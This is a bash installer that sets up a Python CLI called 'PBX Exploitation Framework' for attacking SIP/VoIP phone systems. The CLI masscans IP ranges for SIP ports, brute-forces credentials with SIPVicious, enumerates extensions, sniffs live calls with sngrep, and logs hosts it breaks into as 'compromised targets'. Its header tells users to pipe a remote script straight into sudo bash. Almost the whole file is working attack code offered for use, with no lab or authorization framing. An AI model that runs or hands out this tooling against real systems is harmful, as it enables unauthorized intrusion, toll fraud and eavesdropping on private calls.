#!/bin/bash
# SIP Red Team Toolkit - Complete Auto-Installer (Debian 12)
# Run as: sudo bash <(curl -s https://raw.githubusercontent.com/yourrepo/main/install.sh)

# ===== CONFIGURATION =====
INSTALL_DIR="/opt/sipredteam"
LOG_DIR="/var/log/sipredteam"
BIN_PATH="/usr/local/bin/sipredteam"

# ===== SYSTEM PREP =====
echo -e "\033[1;34m[+] Updating system\033[0m"
apt update -qq && apt upgrade -y

echo -e "\033[1;34m[+] Installing dependencies\033[0m"
apt install -y --no-install-recommends \
  git python3 python3-pip \
  masscan sipcalc jq \
  libpcap-dev libssl-dev libncurses5-dev \
  autoconf automake libtool libsrtp2-dev \
  libxml2-dev libsqlite3-dev libnet1-dev \
  curl wget

# ===== CREATE STRUCTURE =====
mkdir -p $INSTALL_DIR/{tools,wordlists,scripts}
mkdir -p $LOG_DIR
chown -R $SUDO_USER:$SUDO_USER $INSTALL_DIR $LOG_DIR

# ===== INSTALL CORE TOOLS =====
echo -e "\033[1;33m[*] Installing SIPVicious\033[0m"
git clone -q https://github.com/EnableSecurity/sipvicious.git $INSTALL_DIR/tools/sipvicious
pip3 install -q -r $INSTALL_DIR/tools/sipvicious/requirements.txt

echo -e "\033[1;33m[*] Compiling sngrep\033[0m"
git clone -q https://github.com/irontec/sngrep.git $INSTALL_DIR/tools/sngrep
cd $INSTALL_DIR/tools/sngrep
./bootstrap.sh >/dev/null 2>&1
./configure --quiet && make --quiet && make install --quiet
cd - >/dev/null

# ===== DOWNLOAD RESOURCES =====
echo -e "\033[1;33m[*] Downloading wordlists\033[0m"
wget -q -O $INSTALL_DIR/wordlists/common-sip.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
wget -q -O $INSTALL_DIR/wordlists/extensions.txt \
  https://raw.githubusercontent.com/attackdebris/voip-sip-tools/master/extensions_100-999.txt

# ===== INSTALL MAIN CLI =====
echo -e "\033[1;34m[+] Installing CLI tool\033[0m"
sudo tee $BIN_PATH > /dev/null <<'EOF'
#!/usr/bin/env python3
import os
import sys
import json
import re
import subprocess
from datetime import datetime
from time import sleep
from colorama import Fore, Style, init, Back

# Initialize colorama
init(autoreset=True)

# Configuration
CONFIG = {
    "install_dir": "/opt/sipredteam",
    "log_dir": "/var/log/sipredteam",
    "hits_file": "/var/log/sipredteam/compromised_targets.json",
    "scan_ports": "5060,5061,5080,8080,8088",
    "default_wordlist": "/opt/sipredteam/wordlists/common-sip.txt",
    "extensions_range": "100-200",
    "banner": f"""{Fore.RED}
╔═╗╦╔═╗╔═╗╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗╦═╗
╠═╝║╠═╣║ ╦║ ║║  ║╣ ╚═╗ ║ ║╣ ╠╦╝
╩  ╩╩ ╩╚═╝╚═╝╩═╝╚═╝╚═╝ ╩ ╚═╝╩╚═
{Style.RESET_ALL}{Back.BLACK} PBX Exploitation Framework v4.2 {Style.RESET_ALL}"""
}

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(CONFIG["banner"])
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

def log_hit(target, port, vulnerability, details):
    """Log compromised systems to JSON file"""
    entry = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "port": port,
        "vulnerability": vulnerability,
        "details": details
    }
    with open(CONFIG['hits_file'], 'a') as f:
        f.write(json.dumps(entry) + "\n")
    return entry

def run_cmd(cmd, capture=False):
    """Execute shell commands safely"""
    try:
        if capture:
            result = subprocess.run(cmd, shell=True, check=True,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True)
            return result.stdout
        else:
            subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Command failed: {e.cmd}\nError: {e.stderr}{Style.RESET_ALL}")
        return None

def masscan_scan(target):
    """Network discovery with Masscan"""
    print(f"\n{Fore.BLUE}[1/3] Discovering SIP services...{Style.RESET_ALL}")
    output_file = f"{CONFIG['log_dir']}/scan_{datetime.now().strftime('%Y%m%d_%H%M')}.json"
    run_cmd(f"masscan -p{CONFIG['scan_ports']} {target} --rate=1000 -oJ {output_file}")
    
    targets = []
    try:
        with open(output_file) as f:
            scan_data = json.load(f)
            for host in scan_data:
                if 'ports' in host:
                    for port in host['ports']:
                        targets.append((host['ip'], str(port['port'])))
        print(f"{Fore.GREEN}Found {len(targets)} active services{Style.RESET_ALL}")
        return targets
    except Exception as e:
        print(f"{Fore.RED}Scan failed: {str(e)}{Style.RESET_ALL}")
        return []

def cred_attack(target, port):
    """Brute-force SIP credentials"""
    print(f"\n{Fore.YELLOW}» Starting credential attack on {target}:{port}{Style.RESET_ALL}")
    
    # Test default credentials
    defaults = [("admin","admin"), ("admin","password"), ("user","user")]
    for user, pwd in defaults:
        cmd = f"python3 {CONFIG['install_dir']}/tools/sipvicious/svcrack.py -u {user} -w <(echo '{pwd}') {target}"
        result = run_cmd(cmd, capture=True)
        if result and "Authentication successful" in result:
            log_hit(target, port, "DEFAULT_CREDENTIALS", f"{user}:{pwd}")
            return True
    
    # Full wordlist attack
    wordlist = input(f"{Fore.CYAN}Wordlist path [{CONFIG['default_wordlist']}]:{Style.RESET_ALL} ") or CONFIG['default_wordlist']
    extensions = input(f"{Fore.CYAN}Extension range [{CONFIG['extensions_range']}]:{Style.RESET_ALL} ") or CONFIG['extensions_range']
    
    cmd = f"python3 {CONFIG['install_dir']}/tools/sipvicious/svwar.py -e{extensions} -m REGISTER {target}"
    print(f"{Fore.BLUE}Running: {cmd}{Style.RESET_ALL}")
    run_cmd(cmd)
    
    return False

def call_monitoring():
    """Live call monitoring"""
    interface = input(f"{Fore.CYAN}Network interface [eth0]:{Style.RESET_ALL} ") or "eth0"
    print(f"\n{Fore.GREEN}Starting sngrep on {interface}...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Press Ctrl+C to stop{Style.RESET_ALL}")
    run_cmd(f"sngrep -d {interface}")

def show_hits():
    """Display compromised systems"""
    if not os.path.exists(CONFIG['hits_file']):
        print(f"{Fore.RED}No compromised targets found yet{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.GREEN}{'ID':<4} {'Target':<16} {'Port':<6} {'Vulnerability':<24} {'Details'}{Style.RESET_ALL}")
    print("-" * 70)
    
    with open(CONFIG['hits_file'], 'r') as f:
        for idx, line in enumerate(f, 1):
            try:
                entry = json.loads(line)
                print(f"{Fore.YELLOW}{idx:<4}{Style.RESET_ALL} {entry['target']:<16} {entry['port']:<6} "
                      f"{Fore.RED}{entry['vulnerability'][:22]:<24}{Style.RESET_ALL} {entry['details'][:40]}")
            except:
                continue

def main_menu():
    while True:
        print_banner()
        print(f"\n{Fore.CYAN}Main Menu:{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}1.{Style.RESET_ALL} Automated PBX Scan")
        print(f"  {Fore.YELLOW}2.{Style.RESET_ALL} Credential Attack")
        print(f"  {Fore.YELLOW}3.{Style.RESET_ALL} Call Monitoring")
        print(f"  {Fore.YELLOW}4.{Style.RESET_ALL} View Compromised Targets")
        print(f"  {Fore.YELLOW}5.{Style.RESET_ALL} Exit")
        
        choice = input(f"\n{Fore.BLUE}Select option:{Style.RESET_ALL} ")
        
        if choice == "1":
            target = input(f"{Fore.CYAN}Enter target IP/CIDR:{Style.RESET_ALL} ")
            targets = masscan_scan(target)
            for ip, port in targets:
                cred_attack(ip, port)
        
        elif choice == "2":
            target = input(f"{Fore.CYAN}Target IP:{Style.RESET_ALL} ")
            port = input(f"{Fore.CYAN}Port [5060]:{Style.RESET_ALL} ") or "5060"
            cred_attack(target, port)
        
        elif choice == "3":
            call_monitoring()
        
        elif choice == "4":
            show_hits()
        
        elif choice == "5":
            print(f"\n{Fore.GREEN}Exiting...{Style.RESET_ALL}")
            sys.exit(0)
        
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")

if __name__ == "__main__":
    # Ensure log directory exists
    os.makedirs(CONFIG['log_dir'], exist_ok=True)
    
    # Set capabilities if root
    if os.geteuid() == 0:
        os.system("setcap cap_net_raw+ep /usr/bin/masscan 2>/dev/null")
    
    main_menu()
EOF

# ===== FINAL SETUP =====
chmod +x $BIN_PATH
setcap cap_net_raw+ep /usr/bin/masscan 2>/dev/null || true

# ===== COMPLETION =====
echo -e "\033[1;32m[+] Installation complete!\033[0m"
echo -e "Run: \033[1msipredteam\033[0m"
echo -e "Logs: \033[1mless $LOG_DIR/compromised_targets.json\033[0m"
